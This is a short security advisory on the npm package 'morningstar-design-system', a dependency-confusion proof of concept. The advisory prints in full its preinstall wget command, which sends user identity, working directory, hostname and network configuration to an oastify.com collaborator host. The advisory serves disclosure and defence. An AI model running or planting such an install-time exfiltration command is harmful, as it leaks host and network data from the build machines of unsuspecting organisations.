summary: morningstar-design-system exfiltrates host identity and network configuration on install
details: The package.json `preinstall` script runs `wget --quiet "http://1acc4roqgle8wkdds4vogvcjgam1asyh.oastify.com/?user=$(id)&path=$(pwd)&hostname=$(hostname)&network=$(ip a)"`, sending the installer's user identity, working directory, hostname, and full network interface configuration to an attacker-controlled Burp Collaborator subdomain over plain HTTP at `npm install` time. The package name targets Morningstar's internal namespace and the inflated 99.0.2 version is the canonical dependency-confusion shape used to outrank a private-registry copy. The package contents are otherwise a placeholder self-described as a dependency-confusion PoC. Any build system that resolves this name from the public registry will leak host and network reconnaissance data to the attacker before any code is reviewed.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
